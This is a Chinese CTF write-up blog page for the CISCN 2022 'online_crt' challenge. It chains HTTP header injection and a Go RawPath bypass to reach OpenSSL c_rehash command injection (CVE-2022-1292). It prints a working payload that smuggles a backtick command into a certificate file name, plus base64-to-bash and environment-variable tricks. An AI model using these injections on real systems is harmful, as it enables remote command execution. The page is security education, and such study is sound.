<!DOCTYPE html>
<html>
  <head>
<meta name="referrer" content="never">
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-CNTF3L2LQC');
</script>  <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script> 
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    
    <title>
      第15届全国大学生信息安全竞赛 online_crt writeup    c_rehash(CVE-2022-1292)   ciscn 2022 - 白帽酱の博客
    </title>
    <link rel="manifest" href="/manifest.json" />
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
    
<link rel="stylesheet" href="/style/style.css">

  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
</head>
  <body>
    <canvas id='pagemap'></canvas>
    
    <div id="post-toc" class="animated hiddenToc hide">
      <span class="title">Toc</span>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">项目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#c-rehash"><span class="toc-text">c_rehash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-server"><span class="toc-text">go server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E6%B3%A8%E5%85%A5http%E5%A4%B4"><span class="toc-text">url注入http头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go%E7%9A%84RawPath%E7%89%B9%E6%80%A7"><span class="toc-text">go的RawPath特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">构造利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-text">第二步</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8base64-%E7%BC%96%E7%A0%81"><span class="toc-text">使用base64 编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%88%AA%E6%96%AD%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">使用截断环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%8E%B0%E6%9C%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">使用现有环境变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-text">第三步</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
    </div>
    
    <div id="fixed-menu-wrap">
      <span class="iconfont icon-sousuo search-box menu-reset"></span>
      <span class="icon-toc menu-reset">Toc</span>
      <span class="iconfont icon-arrowup menu-reset"></span>
    </div>
    <div id="fixed-menu">
      <span class="iconfont icon-menu-"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <div id="search-shade" class="animated hiddenSearch hide">
      <div class="input-wrap">
        <span class="iconfont icon-sousuo search-box"></span>
        <input type="text" placeholder="Search" />
        <span class="iconfont icon-close"></span>
      </div>
      <div class="search-result">
        <div class="meta">
          <span><b id="result-count">0</b> results found</span>
          <img src="/images/logo.jpeg" />
        </div>
        <ul id="result-box"></ul>
      </div>
    </div>
    <div id="menu-mask" class="animated hideMenuMask hide">
      <span class="iconfont icon-close"></span>
      <div class="nav">
        
        <a href="/" class="">
          首页
        </a>
        
        <a href="/archives" class="">
          归档
        </a>
        
        <a href="/categories" class="">
          分类
        </a>
        
        <a href="/tags" class="">
          标签
        </a>
        
        <a href="/friends" class="">
          友链
        </a>
        
        <a href="/about" class="">
          关于
        </a>
        
      </div>
    </div>
    <div id="header">
      <div class="intro">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <div class="author">白帽酱</div>
      </div>
      <div class="nav">
        <span class="iconfont icon-menu menu-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
    </div>
    <div id="side" class="animated bounceInLeft">
      <div class="shrink">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <span class="iconfont icon-menu toggle-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
      <div class="magnify">
        <div class="about">
          <div class="author">白帽酱</div>
          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        </div>

        <div class="nav">
          
          <a href="/" class="">
            首页
          </a>
          
          <a href="/archives" class="">
            归档
          </a>
          
          <a href="/categories" class="">
            分类
          </a>
          
          <a href="/tags" class="">
            标签
          </a>
          
          <a href="/friends" class="">
            友链
          </a>
          
          <a href="/about" class="">
            关于
          </a>
          
          <a href="#" class="search-box">
            <span class="iconfont icon-sousuo"></span>
          </a>
        </div>
        <div class="bottom">
          <div class="follow">
            
            <a href="https://github.com/burpheart" target="_block">
              <span class="iconfont icon-github"></span>
            </a>
            
            <a href="https://twitter.com/burp_heart" target="_block">
              <span class="iconfont icon-twitter"></span>
            </a>
            
            <a href="https://space.bilibili.com/32890488" target="_block">
              <span class="iconfont icon-bilibili"></span>
            </a>
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
        </div>
      </div>
    </div>
    <div id="container">
      <div class="main animated bounceInRight delay-0.7s">
        <article class="post-entry">
    <div class="header">
      
      <div class="title">第15届全国大学生信息安全竞赛 online_crt writeup    c_rehash(CVE-2022-1292)   ciscn 2022</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2022/05/30</span>
        </span>

        

         
        <span class="item">
          <span class="iconfont icon-folder"></span>
          <span>
              
                
                  <a href="/categories/CTF">CTF</a>
                
              
          </span>
        </span>
        
        
         
          <span class="item">
            <span class="iconfont icon-tag1"></span>
            <span>
                
                  
                    <a href="/tags/CTF">CTF</a>
                  
                
                  
                    <a href="/tags/CVE">CVE</a>
                  
                
            </span>
          </span>
         
      </div>
      <div>
      </div>
    </div>
    <html><head></head><body><p>author:白帽酱<br>题目给了后端源码  一道题利用了前不久出现的一个鸡肋洞 openssl c_rehash(CVE-2022-1292)  题目还是比较有意思的</p>
<h1 id="项目分析">项目分析<a class="post-anchor" href="#项目分析"></a></h1><p>项目后端是pyhton + go<br>pyhton的服务直接暴露给用户<br>pyhton服务 一共有4个路由<br>/getcrt 生成一个x509证书<br>/createlink 调用 c_rehash 创建证书链接<br>/proxy 通过代理访问go服务</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/getcrt'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span><br>    Country = request.form.get(<span class="hljs-string">"Country"</span>, <span class="hljs-string">"CN"</span>)<br>    Province = request.form.get(<span class="hljs-string">"Province"</span>, <span class="hljs-string">"a"</span>)<br>    City = request.form.get(<span class="hljs-string">"City"</span>, <span class="hljs-string">"a"</span>)<br>    OrganizationalName = request.form.get(<span class="hljs-string">"OrganizationalName"</span>, <span class="hljs-string">"a"</span>)<br>    CommonName = request.form.get(<span class="hljs-string">"CommonName"</span>, <span class="hljs-string">"a"</span>)<br>    EmailAddress = request.form.get(<span class="hljs-string">"EmailAddress"</span>, <span class="hljs-string">"a"</span>)<br>    <span class="hljs-keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/createlink'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">info</span>():</span><br>    json_data = {<span class="hljs-string">"info"</span>: os.popen(<span class="hljs-string">"c_rehash static/crt/ &amp;&amp; ls static/crt/"</span>).read()}<br>    <span class="hljs-keyword">return</span> json.dumps(json_data)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/proxy'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proxy</span>():</span><br>    uri = request.form.get(<span class="hljs-string">"uri"</span>, <span class="hljs-string">"/"</span>)<br>    client = socket.socket()<br>    client.connect((<span class="hljs-string">'localhost'</span>, <span class="hljs-number">8887</span>))<br>    msg = <span class="hljs-string">f'''GET <span class="hljs-subst">{uri}</span> HTTP/1.1</span><br><span class="hljs-string">    Host: test_api_host</span><br><span class="hljs-string">    User-Agent: Guest</span><br><span class="hljs-string">    Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">    Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">    Connection: close</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    '''</span><br>    client.send(msg.encode())<br>    data = client.recv(<span class="hljs-number">2048</span>)<br>    client.close()<br>    <span class="hljs-keyword">return</span> data.decode()<br></code></pre></td></tr></tbody></table></figure>
<p>go后端有一个admin路由<br>用于重命名证书文件</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python">func admin(c *gin.Context) {<br>	staticPath := <span class="hljs-string">"/app/static/crt/"</span><br>	oldname := c.DefaultQuery(<span class="hljs-string">"oldname"</span>, <span class="hljs-string">""</span>)<br>	newname := c.DefaultQuery(<span class="hljs-string">"newname"</span>, <span class="hljs-string">""</span>)<br>	<span class="hljs-keyword">if</span> oldname == <span class="hljs-string">""</span> || newname == <span class="hljs-string">""</span> || strings.Contains(oldname, <span class="hljs-string">".."</span>) || strings.Contains(newname, <span class="hljs-string">".."</span>) {<br>		c.String(<span class="hljs-number">500</span>, <span class="hljs-string">"error"</span>)<br>		<span class="hljs-keyword">return</span><br>	}<br>	<span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">""</span> &amp;&amp; c.Request.Host == <span class="hljs-string">"admin"</span> {<br>		err := os.Rename(staticPath+oldname, staticPath+newname)<br>		<span class="hljs-keyword">if</span> err != nil {<br>			<span class="hljs-keyword">return</span><br>		}<br>		c.String(<span class="hljs-number">200</span>, newname)<br>		<span class="hljs-keyword">return</span><br>	}<br><br>	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"no"</span>+c.Request.URL.RawPath+<span class="hljs-string">","</span>+c.Request.Host )<br>}<br></code></pre></td></tr></tbody></table></figure>

<h1 id="解题">解题<a class="post-anchor" href="#解题"></a></h1><h2 id="c-rehash">c_rehash<a class="post-anchor" href="#c-rehash"></a></h2><p>题目中出现了 c_rehash<br>c_rehash是openssl中的一个用perl编写的脚本工具<br>用于批量创建证书等文件 hash命名的符号链接<br>最近c_rehash  出了个命令注入漏洞 (<a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-qjmp-vmxc-7p8r">CVE-2022-1292</a>)<br>经过搜索网上并没有公开的exp (可能因为这个漏洞非常鸡肋)<br>只能通过diff进行分析<br><a target="_blank" rel="noopener" href="https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8">https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8</a><br>这个就是漏洞的commit<br>很容易看出 文件名这里过滤不严 没有过滤反引号就直接把文件名拼接到了命令里<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653838613191-52d0b27d-a7ad-4b41-acc3-6e066db1c1cd.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=451&amp;id=uc182e494&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=564&amp;originWidth=1405&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=56037&amp;status=done&amp;style=none&amp;taskId=u5147b199-d27a-4341-a529-ab524040d22&amp;title=&amp;width=1124" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653838613191-52d0b27d-a7ad-4b41-acc3-6e066db1c1cd.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=451&amp;id=uc182e494&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=564&amp;originWidth=1405&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=56037&amp;status=done&amp;style=none&amp;taskId=u5147b199-d27a-4341-a529-ab524040d22&amp;title=&amp;width=1124" alt="图片.png"></a>所以只要在文件名中使用反引号就可以执行任意命令<br>继续上前追溯</p>
<figure class="highlight perl"><table><tbody><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">hash_dir</span> </span>{<br>    <span class="hljs-keyword">my</span> %hashlist;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">"Doing $_[0]\n"</span>;<br>    <span class="hljs-keyword">chdir</span> $_[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">opendir</span>(DIR, <span class="hljs-string">"."</span>);<br>    <span class="hljs-keyword">my</span> @flist = <span class="hljs-keyword">sort</span> <span class="hljs-keyword">readdir</span>(DIR);<br>    <span class="hljs-keyword">closedir</span> DIR;<br>    <span class="hljs-keyword">if</span> ( $removelinks ) {<br>        <span class="hljs-comment"># Delete any existing symbolic links</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">grep</span> {<span class="hljs-regexp">/^[\da-f]+\.r{0,1}\d+$/</span>} @flist) {<br>            <span class="hljs-keyword">if</span> (-l $_) {<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">"unlink $_"</span> <span class="hljs-keyword">if</span> $verbose;<br>                <span class="hljs-keyword">unlink</span> $_ || <span class="hljs-keyword">warn</span> <span class="hljs-string">"Can't unlink $_, $!\n"</span>;<br>            }<br>        }<br>    }<br>    FILE: <span class="hljs-keyword">foreach</span> $fname (<span class="hljs-keyword">grep</span> {<span class="hljs-regexp">/\.(pem)|(crt)|(cer)|(crl)$/</span>} @flist) {<br>        <span class="hljs-comment"># Check to see if certificates and/or CRLs present.</span><br>        <span class="hljs-keyword">my</span> ($cert, $crl) = check_file($fname);<br>        <span class="hljs-keyword">if</span> (!$cert &amp;&amp; !$crl) {<br>            <span class="hljs-keyword">print</span> STDERR <span class="hljs-string">"WARNING: $fname does not contain a certificate or CRL: skipping\n"</span>;<br>            <span class="hljs-keyword">next</span>;<br>        }<br>        link_hash_cert($fname) <span class="hljs-keyword">if</span> ($cert);<br>        link_hash_crl($fname) <span class="hljs-keyword">if</span> ($crl);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>发现在执行命令前会检查 文件后缀名.(pem)|(crt)|(cer)|(crl) 和文件内容<br>文件内容必须包含证书或者是吊销列表才能通过检查<br>到这里可以整理出这个鸡肋洞的条件了</p>
<h3 id="利用条件">利用条件<a class="post-anchor" href="#利用条件"></a></h3><ol>
<li>执行c_rehash  目标目录下文件可控</li>
<li>文件后缀符合要求</li>
<li>文件内容必须包含证书或者是吊销列表</li>
<li>文件名可控</li>
</ol>
<p>题目中生成证书的功能可以创建一个满足要求的文件</p>
<h2 id="go-server">go server<a class="post-anchor" href="#go-server"></a></h2><p>接下来看go的部分<br>为了实现可控的文件名 我们需要调用go的重命名功能<br>go的路由在重命名前有两个校验<br>c.Request.URL.RawPath != “” &amp;&amp; c.Request.Host == “admin”<br>首先需要绕过这两个验证</p>
<h3 id="url注入http头">url注入http头<a class="post-anchor" href="#url注入http头"></a></h3><p>Request.Host就是请求的host头<br>在python的请求包中host头是固定的 (test_api_host)<br>这里要想办法让go后端认为host值是admin</p>
<p>python 在代理请求时直接使用了socket 发送raw数据包<br>在数据包{uri}处没有过滤<br>所以我们可以直接在uri注入一个host头来替换原先的头<br>注入之后数据包就变成了这样</p>
<figure class="highlight perl"><table><tbody><tr><td class="code"><pre><code class="hljs perl">GET / HTTP/<span class="hljs-number">1.1</span><br>Host: admin<br>User-Agent: Guest<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;<span class="hljs-keyword">q</span>=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>Connection: <span class="hljs-keyword">close</span><br><br><br><br>HTTP/<span class="hljs-number">1.1</span><br>Host: test_api_host<br>User-Agent: Guest<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;<span class="hljs-keyword">q</span>=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>Connection: <span class="hljs-keyword">close</span><br><br><br></code></pre></td></tr></tbody></table></figure>
<p>这样就绕过了host头的校验</p>
<h3 id="go的RawPath特性">go的RawPath特性<a class="post-anchor" href="#go的RawPath特性"></a></h3><p>通过阅读go net库的源码<br>我发现在go中会对原始url进行反转义操作(URL解码)<br>如果反转义后再次转义的url与原始url不同 那么RawPath会被设置为原始url 反之置为空</p>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653877472106-feb12d7a-96da-4603-9f93-94a1e46c02f3.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=502&amp;id=uf224932e&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=628&amp;originWidth=1022&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=99830&amp;status=done&amp;style=none&amp;taskId=uf302f904-3ce4-4081-8211-421971d3723&amp;title=&amp;width=817.6" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653877472106-feb12d7a-96da-4603-9f93-94a1e46c02f3.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=502&amp;id=uf224932e&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=628&amp;originWidth=1022&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=99830&amp;status=done&amp;style=none&amp;taskId=uf302f904-3ce4-4081-8211-421971d3723&amp;title=&amp;width=817.6" alt="图片.png"></a>注释中贴心的给出了示例和详细的功能介绍<br>所以只要我们把url中的任意一个斜杠进行url编码 就可以绕过这个检查了</p>
<h2 id="构造利用链">构造利用链<a class="post-anchor" href="#构造利用链"></a></h2><p>接下来就是构造这个简单的利用链</p>
<h3 id="第一步">第一步<a class="post-anchor" href="#第一步"></a></h3><p>请求 /getcrt 路由 生成一个证书 返回证书路径</p>
<h3 id="第二步">第二步<a class="post-anchor" href="#第二步"></a></h3><p>请求 /proxy   修改证书名为恶意文件名</p>
<p><strong>这里有一些坑点</strong><br>linux文件名虽然可以包大部分可打印字符<br>但是有一个除外 那就是斜杠<br>不能使用斜杠这限制了命令执行的内容<br>下面是我在这次ctf尝试的解决方案<br>在这一步我尝试了几个小时<br>目标环境有些玄学的问题</p>
<h4 id="使用base64-编码">使用base64 编码<a class="post-anchor" href="#使用base64-编码"></a></h4><p>构造 <code>echo Y2F0IC9mbGFnID4gZHNmZ2g= |base64 -d|bash</code><br>尝试使用base64绕过<br>本地测试利用成功<br>在目标机器多次尝试均失败 (可能是目标docker环境问题 缺少base64工具)</p>
<h4 id="使用截断环境变量">使用截断环境变量<a class="post-anchor" href="#使用截断环境变量"></a></h4><p>linux有很多预制的系统环境变量<br>比如PATH SHELL<br>bash 可以通过${变量名:偏移:长度}  简单的截取环境变量值<br>这里我们使用SHELL环境变量的开头第一个字符来替代斜杠<br>${SHELL:0:1}<br>这种方法本地测试成功<br>都是在目标机器多次尝试还是失败</p>
<h4 id="使用现有环境变量">使用现有环境变量<a class="post-anchor" href="#使用现有环境变量"></a></h4><p>构造命令 <code>env &gt;qweqwe</code><br>获取到了目标机器的环境变量值<br>运气非常好 OLDPWD的值刚好为我们所需要的 /<br>最终使用了这个方法成功读取到了flag</p>
<h3 id="第三步">第三步<a class="post-anchor" href="#第三步"></a></h3><p>请求 /createlink 触发 c_rehash   RCE</p>
<p><code>ls $OLDPWD  &gt;qweqwe</code><br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653879835890-c3c6c9cd-c231-49db-820d-a54b8fa1fc93.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=518&amp;id=uaac2c19c&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=647&amp;originWidth=1060&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=54145&amp;status=done&amp;style=none&amp;taskId=uc8c9370c-8d7f-4795-b48f-f0b4a841473&amp;title=&amp;width=848" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653879835890-c3c6c9cd-c231-49db-820d-a54b8fa1fc93.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=518&amp;id=uaac2c19c&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=647&amp;originWidth=1060&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=54145&amp;status=done&amp;style=none&amp;taskId=uc8c9370c-8d7f-4795-b48f-f0b4a841473&amp;title=&amp;width=848" alt="图片.png"></a>成功列出了根目录的内容<br>然后执行 <code>cat ${OLDPWD}flag &gt;jnyghj</code><br>读取flag<br>uri=/admin/rename?oldname=d205092e-c641-423e-82f0-e96f583f3c38.crt&amp;newname=0<code>cat ${OLDPWD}flag &gt;jnyghj</code>.crt<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653839407465-525d0423-4a74-444d-b3f4-30b85a5d0e6a.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=527&amp;id=u4bc87d06&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=659&amp;originWidth=1644&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=80442&amp;status=done&amp;style=none&amp;taskId=u6e0f0b66-39b9-4c60-839b-bcddabb69ee&amp;title=&amp;width=1315.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653839407465-525d0423-4a74-444d-b3f4-30b85a5d0e6a.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=527&amp;id=u4bc87d06&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=659&amp;originWidth=1644&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=80442&amp;status=done&amp;style=none&amp;taskId=u6e0f0b66-39b9-4c60-839b-bcddabb69ee&amp;title=&amp;width=1315.2" alt="图片.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653839429410-34e9ae71-459b-4360-97de-8db4d63192e2.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=382&amp;id=u39a9bb7e&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=478&amp;originWidth=1884&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=88724&amp;status=done&amp;style=none&amp;taskId=u2bbb5f67-2ba1-4417-b803-2f238a170e2&amp;title=%E4%B8%8D%E7%9F%A5%E9%81%93%E5%B0%9D%E8%AF%95%E4%BA%86%E6%9C%89%E5%A4%9A%E5%B0%91%E6%AC%A12333&amp;width=1507.2" data-caption="不知道尝试了有多少次2333" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653839429410-34e9ae71-459b-4360-97de-8db4d63192e2.png#clientId=u7b26199a-7d22-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=382&amp;id=u39a9bb7e&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=478&amp;originWidth=1884&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=88724&amp;status=done&amp;style=none&amp;taskId=u2bbb5f67-2ba1-4417-b803-2f238a170e2&amp;title=%E4%B8%8D%E7%9F%A5%E9%81%93%E5%B0%9D%E8%AF%95%E4%BA%86%E6%9C%89%E5%A4%9A%E5%B0%91%E6%AC%A12333&amp;width=1507.2" alt="不知道尝试了有多少次2333"></a>    </p>
<h2 id="总结">总结<a class="post-anchor" href="#总结"></a></h2><p>因为之前分析过c_rehash这个鸡肋的洞 当时看了一眼标题就猜到了整个利用链<br>没想到还是在构造payload上花了太多时间<br>(由于利用特殊性 这个漏洞在实战应该不太可能遇见)</p>
</body></html>

  
  <div class="post-guide">
    <div class="item left">
        
          <a href="/2022/06/05/cdnlookup/">cdnlookup 一个使用 ECS 遍历智能DNS节点IP地址的工具</a>
        
    </div>
    <div class="item right">
        
          <a href="/2022/05/25/ping2rce-writeup-goahead-environment-variable-inject-bash-hijack/">ping2rce出题人writeup 一种环境变量注入劫持bash的实际利用场景</a>
        
    </div>
  </div>

  

  <div class="post-copyright">
    <div class="auth">
      本文作者：<a href="https://rce.moe">白帽酱</a>
    </div>
    <div class="link">
      永久链接：<a href="https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/">https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/</a>
    </div>
    <div class="declare">
      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
    </div>
  </div>

  <div id="comment"></div>

  
  
</article>
<div id="gitalk-container"></div>
<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
<script src="https://priesttomb.github.io/js/md5.min.js"></script>
<script type="text/javascript">
    new Gitalk({
        clientID: '1488ae49eda310270a91',
        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
        repo: 'hexoblog',
        owner: 'burpheart',
        admin: 'burpheart',
        id: md5(location.pathname),
        distractionFreeMode: true
    }).render('gitalk-container')
</script>
        <footer>
          <div class="copyright">
            ©2022
            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
    </div>
  </body>
  
</html>
<script type="text/javascript">
                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
                </script> <script type="text/javascript">window.addEventListener('load', function() {
    
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app-built')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
